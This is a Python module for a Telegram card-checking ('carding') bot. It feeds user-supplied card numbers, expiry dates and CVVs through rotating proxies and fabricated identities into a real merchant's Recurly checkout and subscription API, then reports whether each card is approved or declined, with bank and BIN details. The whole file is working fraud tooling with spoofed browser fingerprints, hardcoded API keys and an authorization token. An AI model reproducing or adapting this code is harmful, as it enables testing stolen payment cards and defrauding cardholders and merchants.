import requests, time, datetime, sys, json, random
sys.path.append('/checker/')
from Commands import Postgre, Staff
from Commands.Tools.addr import fake


def gate(cc:list, _bin:dict, edit:dict, bot:object) -> dict:
    data  = fake('us')['response']
    proxy = Postgre.proxy()
    bot.raise_post(f"Proxy: {str(proxy)}")
    curl  = requests.Session()
    messages = ['Your transaction was declined due to insufficient funds in your account', 'The security code you entered does not match. Please update the CVV and try again.']
    try:
        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Preparing!</code> 🟨", message_id = edit['message_id'], chat_id = edit['chat_id'])
        
        #//! [Request 1]
        request1 = curl.get('https://get.forcebymojio.com/', proxies = proxy).text
        time.sleep(2)
        
        #//! [Request 2]
        headers2 = {'accept':'*/*', 'content-type':'application/x-www-form-urlencoded', 'origin':'https://get.forcebymojio.com'}
        payload2 = 'events[0][name]=configured&events[0][occurredAt]=2022-11-19T20%3A26%3A43.967Z&events[1][name]=ready&events[1][occurredAt]=2022-11-19T20%3A26%3A43.967Z&version=4.22.6&key=ewr1-Y1629httg2B3DYh78mHolx&deviceId=cdy3NHTWNLWJTTJO&sessionId=IyXBtSqxffai9hVc&instanceId=0IyEzBrSUsVUQZne'
        request2 = curl.post(url = 'https://api.recurly.com/js/v1/events', headers = headers2, data = payload2, proxies = proxy).text
        time.sleep(2)
        
        #//! [Request 3]
        headers3 = {'Accept':'application/json, text/plain, */*', 'Authorization':'831a1895-4526-40bb-9a92-a3387b0b4f3a', 'Content-Type':'application/json', 'Origin':'https://get.forcebymojio.com', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
        payload3 = '{"planCode":"fleet_monthly_3","quantity":1,"currencyCode":"USD"}'
        request3 = curl.post(url = 'https://force-us-phoenix-production-api.moj.io/fleets/fulfillment/calculations/ordersubtotal', headers = headers3, data = payload3, proxies = proxy).text
        time.sleep(2)
        
        #//! [Request 4]
        headers4 = {'accept':'*/*', 'content-type':'application/x-www-form-urlencoded', 'origin':'https://api.recurly.com', 'referer':'https://api.recurly.com/js/v1/field.html', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
        payload4 = f"first_name={data['f_name']}&last_name={data['l_name']}&address1=Timesquare%20321&address2=&city=New%20York&country=US&state=NY&postal_code=10010&number={cc[0]}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fget.forcebymojio.com%2F&browser[screen_height]=768&browser[screen_width]=1366&browser[time_zone_offset]=360&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&month={cc[1]}&year={cc[2]}&cvv={cc[3]}&version=4.22.6&key=ewr1-Y1629httg2B3DYh78mHolx&deviceId=cdy3NHTWNLWJTTJO&sessionId=IyXBtSqxffai9hVc&instanceId=ipoXK7zQ7RyACNM0"
        request4 = curl.post(url = 'https://api.recurly.com/js/v1/token', headers = headers4, data = payload4, proxies = proxy).json()
        token_id = request4['id']
        time.sleep(2)
        
        #//! [Request 5]
        headers5 = {'Accept':'application/json, text/plain, */*', 'Authorization':'831a1895-4526-40bb-9a92-a3387b0b4f3a', 'Content-Type':'application/json', 'Host':'force-us-phoenix-production-api.moj.io', 'Origin':'https://get.forcebymojio.com', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
        payload5 = '{"ClientId":"154bc839-ad47-4738-ba8a-c7139b1c2bda","TokenId":"'+token_id+'","FirstName":"'+data['f_name']+'","LastName":"'+data['l_name']+'","Email":"'+data['l_name']+''+data['f_name']+'123@gmail.com","PhoneNumber":"144357269'+str(random.randint(10, 99))+'","CompanyName":"SKAN DEVELOPENT","PlanCode":"fleet_monthly_3","CouponCode":"","BillingAddress":{"FirstName":"'+data['f_name']+'","LastName":"'+data['l_name']+'","Phone":"14452417281","Company":"SKAN DEVELOPENT","Street1":"Timesquare 321","Street2":"","City":"New York","Region":"NY","PostalCode":"10010","Country":"US"},"ShippingAddress":{"FirstName":"'+data['f_name']+'","LastName":"'+data['l_name']+'","Phone":"14452417281","Company":"SKAN DEVELOPENT","Street1":"Timesquare 321","Street2":"","City":"New York","Region":"NY","PostalCode":"10010","Country":"US"},"DeviceCount":2,"LeadSource":""}'
        request5 = curl.post(url = 'https://force-us-phoenix-production-api.moj.io/fleets/fulfillment/registrations', headers = headers5, data = payload5, proxies = proxy).text

        if len(request5) > 0:
            resp = request5.replace('"', '')
            if resp in messages:
                return {'status':True, 'response':resp, 'success': 'approved! ✅', 'message_id':a['message_id']}
            else:
                return {'status':True, 'response':resp, 'success': 'declined! ❌', 'message_id':a['message_id']}
        else:
            return {'status':True, 'response':'Approved!', 'success': 'approved! ✅', 'message_id':a['message_id']}
    except Exception as error:
        bot.raise_post(f"Error en el gate: {str(error)[0:350]}")
        return {'status':False, 'raise':error}
    


def gateCmd(update, context, bot) -> None:
    bot.sendAction(chat_id = update['chat_id'], action = 'typing')
    a = bot.replyMessage(text=f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Waiting!</code> 🟥", chat_id = update['chat_id'], reply_id = update['message_id'])
    args = context['args'] if len(context['args']) > 0 else update['reply_to'] if update['reply_to'] != 'None' else context['args']
    args = args if type(args) == str else args['text']
    user = Postgre.view(user_id=update['user_id'])
    chat = Postgre.view(user_id=update['chat_id'])
    cmd  = Postgre.viewCmd(cmd = context['command'])
    b = Staff.gates(user = user, chat =  chat, text = args, cmd = cmd, bot = bot)
    try:    
        if b['status']:
            a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checking!</code> 🟧", chat_id = update['chat_id'], message_id = a['message_id'])
            now  = time.time()
            Postgre.update(f"UPDATE users SET l_reg = '{datetime.datetime.now()}' WHERE user_id = '{update['user_id']}'")
            checker = gate(cc = b['cc'], _bin = b['bin'], edit = {'chat_id':update['chat_id'], 'message_id':a['message_id']}, bot = bot)
            if checker['status']:
                a = bot.editMessage(text = f"<b><i>$ {cmd['name'].title()} 🌩</i></b>\n━━━━━━━━━━━━━━━━━\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Cc:</u></i></b> <code>{b['cc'][0]}|{b['cc'][1]}|{b['cc'][2]}|{b['cc'][3]}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Status:</u></i></b> <b>{checker['success'].title()}</b>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Response:</u></i></b> <b>{checker['response'].title()}</b>\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Info:</u></i></b> <code>{b['bin']['brand'].title()}</code> - <code>{b['bin']['type'].title()}</code> - <code>{b['bin']['level'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Bank:</u></i></b> <code>{b['bin']['bank'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Country:</u></i></b> <code>{b['bin']['country'].title()}</code>[{b['bin']['flag']}] - <code>{b['bin']['currency'].title()}</code>\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>T.Taken:</u></i></b> <code>{str(round((time.time() - now), 1))}'s</code> | <b><i><u>Proxy:</u></i></b> <code>Live[✅]</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>User:</u></i></b> @{update['username']} [<b>{user['c_name'].title()}</b>]\n━━━━━━━━━━━━━━━━━\n[↯] <b><i><u>By:</u></i></b> <code>SoyQuetzal</code> ☁️", chat_id=update['chat_id'], message_id=checker['message_id'])
            else:
                Postgre.update(f"UPDATE users SET l_reg = '{user['l_reg']}' WHERE user_id = '{update['user_id']}'")
                bot.editMessage(text = f"<b><i>$ Wrong Data_ ⚠️</i></b>\n<b><i><u>Raise:</u></i></b> <code>There is a problem, contact an administrator and place recheck!</code>", chat_id = update['chat_id'], message_id = a['message_id'])
        else:
            bot.editMessage(text = f"{b['text']}", chat_id = update['chat_id'], message_id = a['message_id'])
    except Exception as a:
        bot.raise_post(f"Error en pdCMD, {str(a)}")